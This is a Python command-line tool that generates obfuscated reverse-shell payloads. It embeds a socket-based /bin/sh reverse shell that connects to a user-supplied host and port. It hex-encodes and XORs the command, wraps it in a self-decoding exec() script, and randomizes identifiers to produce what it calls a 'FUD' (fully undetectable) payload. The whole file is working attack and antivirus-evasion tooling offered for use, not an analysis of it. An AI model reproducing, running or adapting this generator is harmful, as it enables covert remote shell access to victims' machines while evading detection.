#!/usr/bin/env python3
import argparse
import binascii
import random
import re

from termcolor import colored

banner = '''
╭━━╮╱╱╱╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╱╱╱╱╱╱╭╮
┃╭╮┃╱╱╱┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╱╱╱╱╱╱╭╯╰╮
┃╰╯╰┳━━┫┃╭━━┳━━╮┃┃╱╰╋━┳╮╱╭┳━┻╮╭╋━━┳━╮
┃╭━╮┃╭╮┃┃┃╭╮┃╭╮┃┃┃╱╭┫╭┫┃╱┃┃╭╮┃┃┃┃━┫╭╯
┃╰━╯┃╭╮┃╰┫╰╯┃╰╯┃┃╰━╯┃┃┃╰━╯┃╰╯┃╰┫┃━┫┃
╰━━━┻╯╰┻━┻━╮┣━━╯╰━━━┻╯╰━╮╭┫╭━┻━┻━━┻╯
╱╱╱╱╱╱╱╱╱╭━╯┃╱╱╱╱╱╱╱╱╱╭━╯┃┃┃
╱╱╱╱╱╱╱╱╱╰━━╯╱╱╱╱╱╱╱╱╱╰━━╯╰╯
    
    '''
def print_banner(banner):
    rainbow_colors = ["red", "magenta", "blue", "cyan", "green", "yellow", "white"]
    char_r = list(banner)
    for i in range(len(char_r)):
        if char_r[i] != "\n":
            char_r[i] = colored(char_r[i], random.choice(rainbow_colors))
    banner_colored = "".join(char_r)
    print(banner_colored)
    
# Function To Generate Random Names
def randomize_name(name):
    name_length = len(name)
    random_name = ""
    for i in range(name_length):
        random_name += chr(random.randint(97,122))
    return random_name

def randomize_names(payload):
    # Create A Dictionary To Map Variables And Function Names
    names_map = {}

    # Regular Expression To Match Function Names And Variable Names
    function_name_pattern = re.compile("def (.*)\(")
    variable_name_pattern = re.compile("([a-zA-Z_][a-zA-Z0-9_]*) *= *")

    # Find All Function Names And Variable Names
    function_names = re.findall(function_name_pattern, payload)
    variable_names = re.findall(variable_name_pattern, payload)

    # Generate Random Names For All Functions And Variables
    for function_name in function_names:
        random_name = randomize_name(function_name)
        names_map[function_name] = random_name
    for variable_name in variable_names:
        random_name = randomize_name(variable_name)
        names_map[variable_name] = random_name

    # Replace Old Names With New Randomized Names
    for old_name, new_name in names_map.items():
        payload = payload.replace(old_name, new_name)

    return payload

def reverse_shell_gen(host, port, infile, outfile):
    if infile:
        with open(infile) as f:
            reverse_shell_command = f.read()
            modules = re.findall("import (.*)", reverse_shell_command)
            modules = set(modules)
    else:
        reverse_shell_command = "import socket, subprocess, os; sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM);sock.connect(('{}',{}));os.dup2(sock.fileno(),0); os.dup2(sock.fileno(), 1); os.dup2(sock.fileno(),2);p=subprocess.call(['/bin/sh', '-i']);p.wait();".format(host, port)
        modules = set(["socket", "subprocess", "os"])

    # Encoding The Reverse Shell Command into Hexadecimal
    encoded = reverse_shell_command.encode("utf-8").hex()

    #Generating FUD Payload
    reverse_shell_payload = ""
    for char in encoded:
        encoded_char = ord(char) ^ 0xFF
        reverse_shell_payload += chr(encoded_char)

    #Generating Payload Script
    payload_script = "import binascii\n%s\nencoded = '" % "\n".join(["import %s" % module for module in modules]) + reverse_shell_payload +  "'\n\ndef decode_reverse_shell(encoded):\n    decoded = ''\n    for char in encoded:\n        decoded += chr(ord(char) ^ 0xFF)\n    return binascii.unhexlify(decoded).decode('utf-8') \n\nreverse_shell_command = decode_reverse_shell(encoded) \nexec(reverse_shell_command)"

    # Randomize Function Names And Variable Names
    payload_script = randomize_names(payload_script)

    # Print The FUD Payload into file
    with open(outfile,'w') as f:
        print(colored("[+] Here Is Your Encoded Reverse Shell Payload String With Xor + Hex: \n", "white", attrs=["bold"]))
        if len(reverse_shell_payload) > 1000:
            print(colored(reverse_shell_payload[:1000] + ' ... (full payload length: %d chars)\n' % len(reverse_shell_payload), "green"))
        else:
            print(colored(reverse_shell_payload + '\n', "green"))
        f.write(payload_script + '\n')
        

        print(colored("\n[+] Here Is Your Decoded Reverse Shell Command: \n", "white", attrs=["bold"]))
        print(colored(binascii.unhexlify(encoded).decode('utf-8'),'green'))

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Generates a reverse shell payload in Xor Encoding.')
    parser.add_argument('-lh', type=str, help='Specifies the host for the reverse shell.')
    parser.add_argument('-lp', type=int, help='Specifies the port for the reverse shell.')
    parser.add_argument('-i', type=str, help='Specifies the input file for the payload.')
    parser.add_argument('-o', type=str, required=True, help='Specifies the output file for the payload.')
    args = parser.parse_args()
    print_banner(banner)
    reverse_shell_gen(args.lh, args.lp, args.i, args.o)